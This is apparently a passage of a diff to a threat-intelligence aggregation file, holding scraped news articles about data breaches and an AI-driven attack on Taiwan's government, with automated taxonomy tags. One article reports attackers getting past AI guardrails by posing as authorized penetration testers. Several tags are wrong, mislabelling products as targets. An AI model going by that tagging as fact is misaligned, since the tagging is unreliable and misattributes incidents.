+        "full_body": "The recently disclosed CareCloud data breach affects more than 3.7 million individuals, far more than initially believed. The cloud-based healthcare solutions provider revealed in early July that it had detected a network intrusion in mid-March. The breach was discovered following a disruption involving an electronic health record environment. An investigation showed that threat actors gained access to one of CareCloud’s AWS environments between March 10 and March 16. The hackers claimed to have exfiltrated information from databases in the compromised environment, according to the company. The stolen information includes names, addresses, SSNs, driver’s license numbers, dates of birth, health insurance information, and medical and healthcare information. For some individuals (a very limited subset), the attackers also obtained full payment card information. No known cybercrime group appears to have publicly taken credit for hacking CareCloud, and the company has not said who is behind the attack. It is unclear whether CareCloud paid a ransom to prevent the data from being made public. Data breach reports published by AGs in several states in July showed that tens of thousands of individuals had been affected in each state, for a total of roughly 350,000 . Advertisement. Scroll to continue reading. The entries on the AG websites still show those numbers at the time of writing, but the healthcare data breach tracker maintained by the Department of Health and Human Services (HHS) revealed this week that the total number of individuals exceeds 3 million. The HHS tracker on Monday showed 3,371,508 affected individuals, and on Tuesday the number was updated to 3,756,469. Given the ten-fold increase over earlier reports, the initial entry raised suspicion of a clerical typo. However, the HHS confirmed to SecurityWeek that the figure is accurate and reflects the most recent data provided to the agency. Related : 3.8 Million Impacted by Unlimited Technology Systems Data Breach Related : 311,000 Impacted by Brown Health Medical Group-MA Data Breach Related : 150,000 Impacted by Madera Community Hospital Data Breach Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Irregular Details How a Naming Error Let AI Models Attack a Real Company Conflicting Test Goals Pushed Claude Agents to Deploy Self-Replicating Malware Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure Google Cloud Sets Out Post-Quantum Roadmap With 2029 Readiness Goal Over 1,000 Charities Hit by Beacon CRM Data Breach Cybersecurity M&A Roundup: 21 Deals Announced in July 2026 White House Mobilizes Security Firms for Operations Against Foreign Cybercrime Gangs SharePoint Vulnerability Exploited Shortly After PoC Release Latest News Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw Heights Finance Data Breach Impacts at Least 1.2 Million Individuals GitLab Patches Critical Code Injection Vulnerability Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 J",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "government",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "GitLab",
+            "Google Cloud",
+            "Microsoft SharePoint"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "poc_available"
+          ],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "GitLab": "target",
+            "Google Cloud": "target",
+            "Microsoft SharePoint": "target",
+            "Anthropic/Claude": "target",
+            "Fortinet": "target",
+            "WordPress": "target",
+            "AWS": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "AWS",
+                "mention",
+                0.3
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SecurityWeek",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "CareCloud Data Breach Impact Grows to 3.7 Million Individuals",
+          "link": "https://www.securityweek.com/carecloud-data-breach-impact-grows-to-3-7-million-individuals/",
+          "published": "2026-08-19T06:56:43+00:00",
+          "summary": "The data breach was initially believed to affect roughly 350,000 people, but the HHS breach tracker shows a far bigger impact. The post CareCloud Data Breach Impact Grows to 3.7 Million Individuals appeared first on SecurityWeek .",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "government",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "GitLab",
+              "Google Cloud",
+              "Microsoft SharePoint"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "poc_available"
+            ],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitLab": "target",
+              "Google Cloud": "target",
+              "Microsoft SharePoint": "target",
+              "Anthropic/Claude": "target",
+              "Fortinet": "target",
+              "WordPress": "target",
+              "AWS": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "AWS",
+                  "mention",
+                  0.3
+                ]
+              ]
             }
           }
         }
@@ -5994,8 +6029,7 @@
       "taxonomy": {
         "threat_categories": [
           "data_breach",
-          "ransomware_extortion",
-          "zero_day"
+          "ransomware_extortion"
         ],
         "actor_attribution": [],
         "affected_industries": [
@@ -6010,10 +6044,7 @@
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "incident_report"
         ],
@@ -6028,12 +6059,11 @@
         "link": "https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/",
         "published": "2026-08-18T09:18:34+00:00",
         "summary": "Hackers stole names, addresses, phone numbers, Social Security numbers, and financial information from a third-party platform. The post Heights Finance Data Breach Impacts at Least 1.2 Million Individuals appeared first on SecurityWeek .",
-        "full_body": "Consumer lender Heights Finance Holdings Co. is notifying over 1.2 million people that their personal and financial information was stolen in a data breach. In early May, Heights discovered that hackers accessed a third-party cloud-based platform used for customer data storage, the company said in an incident notice . The loan provider says the platform has been secured and that its operations were not affected, as the incident was limited to the cloud-based platform. “It did not affect any of our loan management systems or other computer systems or networks. We immediately activated our incident response protocols, brought in outside cybersecurity specialists to investigate, and reported the incident to federal law enforcement,” Heights says. During the attack, the hackers accessed and stole personal and financial information, including names, addresses, email addresses, phone numbers, Social Security numbers, government ID numbers, driver’s license numbers, bank account information, account details, dates of birth, and other information customers shared with the company. “Your information may be involved if you received a loan through Heights, or if you inquired about or applied for a loan product (including through a third party). Your information may also be involved if you were a former borrower of Curo Management or any of its former or current related brands,” the lender says. Advertisement. Scroll to continue reading. Based on notices sent to the Attorney General’s Offices in several states, more than 1.2 million people have been affected: 734,828 in Texas, 486,463 in South Carolina, 26 in New Hampshire, and 21 in Vermont. Heights is providing the affected individuals with 24 months of free credit monitoring and identity protection services. According to the company, its monitoring of the dark web has found no evidence that the hackers have shared the information stolen in the attack. Heights has not named the threat actor behind the data breach, and SecurityWeek has not seen any known ransomware or extortion group claiming responsibility for it. Related: 680,000 Impacted by French Tax Authority Data Breach Related: 40,000 Impacted by SafePal Data Breach Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: 1.6 Million Likely Impacted by RingCentral Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 680,000 Impacted by French Tax Authority Data Breach 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day Latest News Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw GitLab Patches Critical Code Injection Vulnerability Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it’s time to rethink prevention as the strongest default. Re",
+        "full_body": "Consumer lender Heights Finance Holdings Co. is notifying over 1.2 million people that their personal and financial information was stolen in a data breach. In early May, Heights discovered that hackers accessed a third-party cloud-based platform used for customer data storage, the company said in an incident notice . The loan provider says the platform has been secured and that its operations were not affected, as the incident was limited to the cloud-based platform. “It did not affect any of our loan management systems or other computer systems or networks. We immediately activated our incident response protocols, brought in outside cybersecurity specialists to investigate, and reported the incident to federal law enforcement,” Heights says. During the attack, the hackers accessed and stole personal and financial information, including names, addresses, email addresses, phone numbers, Social Security numbers, government ID numbers, driver’s license numbers, bank account information, account details, dates of birth, and other information customers shared with the company. “Your information may be involved if you received a loan through Heights, or if you inquired about or applied for a loan product (including through a third party). Your information may also be involved if you were a former borrower of Curo Management or any of its former or current related brands,” the lender says. Advertisement. Scroll to continue reading. Based on notices sent to the Attorney General’s Offices in several states, more than 1.2 million people have been affected: 734,828 in Texas, 486,463 in South Carolina, 26 in New Hampshire, and 21 in Vermont. Heights is providing the affected individuals with 24 months of free credit monitoring and identity protection services. According to the company, its monitoring of the dark web has found no evidence that the hackers have shared the information stolen in the attack. Heights has not named the threat actor behind the data breach, and SecurityWeek has not seen any known ransomware or extortion group claiming responsibility for it. Related: 680,000 Impacted by French Tax Authority Data Breach Related: 40,000 Impacted by SafePal Data Breach Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: 1.6 Million Likely Impacted by RingCentral Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates 680,000 Impacted by French Tax Authority Data Breach 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Latest News CareCloud Data Breach Impact Grows to 3.7 Million Individuals Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw GitLab Patches Critical Code Injection Vulnerability Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it’s time to rethink prevention as the stronge",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
             "ransomware_extortion",
-            "zero_day",
             "data_breach"
           ],
           "actor_attribution": [],
@@ -6049,10 +6079,7 @@
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
+          "urgency_signals": [],
           "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
           "role_map": {
@@ -6078,7 +6105,6 @@
           "taxonomy": {
             "threat_categories": [
               "ransomware_extortion",
-              "zero_day",
               "data_breach"
             ],
             "actor_attribution": [],
@@ -6094,10 +6120,7 @@
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
+            "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
             "role_map": {
@@ -7737,147 +7760,27 @@
       ]
     },
     {
-      "cluster_id": "ff9d8c251f",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "ransomware_extortion",
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Azure",
-          "GitLab"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "SecurityWeek",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "680,000 Impacted by French Tax Authority Data Breach",
-        "link": "https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/",
-        "published": "2026-08-17T13:53:55+00:00",
-        "summary": "Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .",
-        "full_body": "France’s Directorate General of Public Finances (DGFiP) has disclosed a data breach impacting approximately 680,000 individuals. The incident was disclosed after a threat actor boasted on a hacking forum about accessing DGFiP’s internal systems and exfiltrating data. According to DGFiP, the threat actor accessed its systems in June and July, and the unauthorized access was suspended immediately upon detection. However, the public tax authority did not discover evidence of data exfiltration at the time. Last week, DGFiP confirmed that the attackers used compromised credentials for an employee and a third-party account to access its systems and steal the information of 678,000 users. According to the finance agency, reference tax income, withholding tax rate, company names and unique identifiers, and cadastral data on real estate addresses and surfaces were compromised. No other information, including usernames and passwords, was compromised in the attack, which was immediately reported to France’s data protection authority CNIL. Advertisement. Scroll to continue reading. DGFiP says it continues to investigate the nature and scope of the data breach, as well as the exact number of potentially affected individuals. The tax authority says it will contact each affected individual directly. The incident came to light roughly one month after another European government agency, Romania’s National Agency for Cadastre and Property Registration (ANCPI), fell victim to a disruptive cyberattack. ANCPI was reportedly hacked by a threat actor known as ByteToBreach, who stole information including employee credentials and internal documents and attempted to extort the agency. When the extortion attempt failed, the hacker reportedly wiped the encrypted data, disrupting official applications, sites, and email services, and bringing Romania’s real estate market to a standstill. The central database of the cadastral system, containing property and real estate rights records, was not affected. Still, ANCPI scrambled for roughly three weeks to rebuild its servers and restore the affected applications. Related: 40,000 Impacted by SafePal Data Breach Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: Trivy, Not LiteLLM Behind the 2,500 Org Compromise Related: Irregular Details How a Naming Error Let AI Models Attack a Real Company Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day Latest News Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw Heights Finance Data Breach Impacts at Least 1.2 Million Individuals GitLab Patches Critical Code Injection Vulnerability Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "zero_day",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "government"
-          ],
-          "affected_products": [
-            "GitLab",
-            "Apple iOS/macOS",
-            "Azure"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "GitLab": "target",
-            "Apple iOS/macOS": "target",
-            "Azure": "target",
-            "Fortinet": "target",
-            "WordPress": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "SecurityWeek",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "680,000 Impacted by French Tax Authority Data Breach",
-          "link": "https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/",
-          "published": "2026-08-17T13:53:55+00:00",
-          "summary": "Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "zero_day",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "government"
-            ],
-            "affected_products": [
-              "GitLab",
-              "Apple iOS/macOS",
-              "Azure"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "GitLab": "target",
-              "Apple iOS/macOS": "target",
-              "Azure": "target",
-              "Fortinet": "target",
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "a52785cdd9",
       "priority_score": 8,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "apt_espionage",
+          "supply_chain"
+        ],
         "actor_attribution": [],
         "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
           "government"
         ],
-        "affected_products": [],
+        "affected_products": [
+          "Anthropic/Claude",
+          "GitHub",
+          "OpenAI/ChatGPT"
+        ],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -7896,22 +7799,35 @@
         "link": "https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/",
         "published": "2026-08-12T17:05:01+00:00",
         "summary": "Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .",
-        "full_body": "",
-        "fetch_status": "not_attempted",
+        "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close Suspected Chinese hackers used open-source artificial intelligence models to run a cyberattack against the Taiwanese government in the first publicly known case of an autonomous AI hack hitting a government target, according to research published Wednesday. The hackers extracted more than 2,500 personnel records, among other data, in the “near-autonomous attack,” researchers at Israeli cyber firm Dream wrote in a blog post . The attackers set up the framework so that it could “adapt mid-operation without human intervention.” The framework “implements dedicated research phases it calls ‘Learning Cycles’ — autonomous sessions where the AI system searches vulnerability databases, GitHub repositories, and security research publications for techniques specifically applicable to its target government’s infrastructure,” the post reads. And then it kept going. Advertisement “The attacker didn’t stop at primary targets,” Dream said. “It expanded the operation to government IT supply chain vendors, a nuclear safety agency, a government email system, and 7+ energy sector companies — scanning them all in parallel for misconfigurations, exposed admin interfaces, and exploitable vulnerabilities.” It also learned from its mistakes as it went on, Dream said in identifying what stood out about the campaign. Autonomous AI-powered cyberattacks have raised alarms in the past: Anthropic reported last fall that it stopped the first autonomous cyber espionage campaign, although researchers noted that the “autonomous” campaign still required significant human work . The Financial Times first reported the Dream research and details on the target. The hackers used two popular open-source AI frameworks, Hermes and OpenClaw, to set up the Taiwan operation. They bypassed safety guardrails by framing the work as authorized penetration testing, according to Dream. Advertisement The firm discovered the operation via an online archive of 160 megabytes and nearly 1,400 files, revealing “a multi-agent AI system that achieved confirmed, real-world compromises against state infrastructure.” As with the autonomous cyber espionage campaign uncovered last fall, the attack Dream examined also noted the need for human tinkering. “We increasingly see threat actors leveraging AI for autonomous offensive operations,” the company wrote. “But building a system that actually works at this level takes more work than ‘just’ running a model. It demands careful adjustment to the specific task, optimization of agent coordination, and fine-tuning of decision logic — the kind of sophistication evident in this framework’s Bayesian prioritization, self-correction loops, and adaptive research cycles.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops In a pair of blogs posted Monday, OpenAI said it was updating its Daybreak program – which provides unreleased frontier models to private organizations and governments for defensive cybersecurity work – and introducing a new model variant. (Photo by Samuel Boivin/NurPhoto via Getty Images) (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Trump turns to private sector in offensive hacking operations memo Federal judge issues second order blocking Trump mail-in voting directive NIST wants to overhaul its vulnerability database for the AI age The FTC wants to regulate AI for ideological bias Technology How companies could share cyber risks without exposing their secrets Sen. Wyden urges feds to discard older, insecure, public-facing VPNs White House accuses Chinese company of distilling Anthropic’s Fable OpenAI says model test was behind Hugging Face hack Threats Tech contractor f",
+        "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "supply_chain",
+            "apt_espionage"
+          ],
           "actor_attribution": [],
           "affected_industries": [
-            "government"
+            "financial_services",
+            "government",
+            "critical_infrastructure"
           ],
-          "affected_products": [],
+          "affected_products": [
+            "OpenAI/ChatGPT",
+            "GitHub",
+            "Anthropic/Claude"
+          ],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {},
+          "role_map": {
+            "OpenAI/ChatGPT": "target",
+            "GitHub": "target",
+            "Anthropic/Claude": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -7926,19 +7842,32 @@
           "published": "2026-08-12T17:05:01+00:00",
           "summary": "Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "supply_chain",
+              "apt_espionage"
+            ],
             "actor_attribution": [],
             "affected_industries": [
-              "government"
+              "financial_services",
+              "government",
+              "critical_infrastructure"
             ],
-            "affected_products": [],
+            "affected_products": [
+              "OpenAI/ChatGPT",
+              "GitHub",
+              "Anthropic/Claude"
+            ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
-            "role_map": {},
+            "role_map": {
+              "OpenAI/ChatGPT": "target",
+              "GitHub": "target",
+              "Anthropic/Claude": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -8371,29 +8300,23 @@
       "theme_key": "apple-ios-macos",
       "dominant_features": {
         "threat_categories": [
-          "data_breach",
-          "zero_day",
           "active_exploitation",
-          "ransomware_extortion"
+          "data_breach"
         ],
         "affected_industries": [
           "financial_services",
           "government"
         ],
         "affected_products": [
-          "Apple iOS/macOS",
-          "Azure",
-          "GitLab"
+          "Apple iOS/macOS"
         ],
         "urgency_signals": [
-          "actively_exploited",
-          "zero_day",
-          "no_patch_yet"
+          "actively_exploited"
         ]
       },
-      "cluster_count": 7,
-      "article_count": 17,
-      "cohesion": 0.235,
+      "cluster_count": 6,
+      "article_count": 15,
+      "cohesion": 0.204,
       "shared_strong_signals": [
         "Apple iOS/macOS"
       ],
@@ -8405,8 +8328,7 @@
         "a50e916d10",
         "7d705c8d6a",
         "7e142768f0",
-        "63d69c8e14",
-        "ff9d8c251f"
+        "63d69c8e14"
       ],
       "links": [
         "https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html",
@@ -8422,8 +8344,7 @@
         "https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges",
         "https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html",
         "https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/",
-        "https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/",
-        "https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/"
+        "https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/"
       ]
     },
     {
@@ -8442,9 +8363,9 @@
           "preauth_unauth"
         ]
       },
-      "cluster_count": 5,
-      "article_count": 11,
-      "cohesion": 0.219,
+      "cluster_count": 4,
+      "article_count": 10,
+      "cohesion": 0.237,
       "shared_strong_signals": [
         "WordPress"
       ],
@@ -8452,7 +8373,6 @@
       "also_targets": [],
       "cluster_ids": [
         "a7b2f82e67",
-        "ad3b948659",
         "8a66834bf6",
         "7d705c8d6a",
         "b7b068c390"
@@ -8462,7 +8382,6 @@
         "https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles",
         "https://www.securityweek.com/300000-wordpress-sites-potentially-exposed-to-hacking-due-to-form-plugin-flaw/",
         "https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/",
-        "https://www.exploit-db.com/exploits/52642",
         "https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/",
         "https://www.securityweek.com/gitlab-patches-critical-code-injection-vulnerability/",
         "https://www.helpnetsecurity.com/2026/08/18/gitlab-critical-code-injection-flaw-cve-2026-19478/",
@@ -8478,10 +8397,13 @@
       "dominant_features": {
         "threat_categories": [
           "ransomware_extortion",
-          "active_exploitation"
+          "active_exploitation",
+          "data_breach"
         ],
         "affected_industries": [
-          "government"
+          "government",
+          "healthcare",
+          "financial_services"
         ],
         "affected_products": [
           "Microsoft SharePoint"
@@ -8490,11 +8412,12 @@
           "CVE-2026-45659"
         ],
         "urgency_signals": [
-          "actively_exploited"
+          "actively_exploited",
+          "poc_available"
         ]
       },
-      "cluster_count": 3,
-      "article_count": 4,
+      "cluster_count": 4,
+      "article_count": 5,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "Microsoft SharePoint"
@@ -8504,12 +8427,53 @@
       "cluster_ids": [
         "46d0bf1827",
         "7e142768f0",
+        "696cb9ee63",
         "324eddbb3a"
       ],
       "links": [
         "https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/",
         "https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/",
+        "https://www.securityweek.com/carecloud-data-breach-impact-grows-to-3-7-million-individuals/",
         "https://thehackernews.com/2026/08/attackers-exploit-sharepoint.html"
+      ]
+    },
+    {
+      "label": "data breach targeting GitLab",
+      "anchor_signal": "GitLab",
+      "theme_key": "gitlab",
+      "dominant_features": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [
+          "GitLab",
+          "Apple iOS/macOS"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 6,
+      "cohesion": 0.26,
+      "shared_strong_signals": [
+        "GitLab"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "7d705c8d6a",
+        "696cb9ee63",
+        "63d69c8e14"
+      ],
+      "links": [
+        "https://www.securityweek.com/gitlab-patches-critical-code-injection-vulnerability/",
+        "https://www.helpnetsecurity.com/2026/08/18/gitlab-critical-code-injection-flaw-cve-2026-19478/",
+        "https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges",
+        "https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html",
+        "https://www.securityweek.com/carecloud-data-breach-impact-grows-to-3-7-million-individuals/",
+        "https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/"
       ]
     },
     {
@@ -8733,7 +8697,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 5,
+      "article_count": 4,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "UNC5174"
@@ -8748,36 +8712,6 @@
         "https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html",
         "https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html",
         "https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw"
-      ]
-    },
-    {
-      "label": "CVE-2026-68820 exploitation activity",
-      "anchor_signal": "CVE-2026-68820",
-      "theme_key": "cve-2026-68820",
-      "dominant_features": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "cve_ids": [
-          "CVE-2026-68820"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 3,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "CVE-2026-68820"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "7e142768f0",
-        "22bf2708a0"
-      ],
-      "links": [
-        "https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/",
